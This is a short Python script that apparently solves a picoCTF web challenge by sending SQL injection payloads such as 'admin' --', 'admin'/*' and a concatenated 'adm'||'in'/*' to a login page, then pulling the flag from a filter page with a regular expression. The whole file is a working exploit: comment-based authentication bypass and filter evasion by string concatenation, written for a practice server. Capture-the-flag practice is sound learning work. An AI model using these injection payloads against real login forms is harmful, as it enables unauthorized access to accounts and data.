import requests
import re

url1 = "http://jupiter.challenges.picoctf.org:29164/index.php"
url2 = "http://jupiter.challenges.picoctf.org:29164/filter.php"
payload1 = {"user": "admin' --", "pass": "haha"}
session = requests.session()
session.post(url1, payload1)
payload2_3 = {"user": "admin'/*", "pass": "haha"}
session.post(url1, payload2_3)
session.post(url1, payload2_3)
payload4_5 = {"user":"adm'||'in'/*", "pass":"haha"}
session.post(url1,payload4_5)
session.post(url1, payload4_5)
r =session.get(url2)
flag = re.findall(r'picoCTF{.*?}', r.text)[0]
print(flag)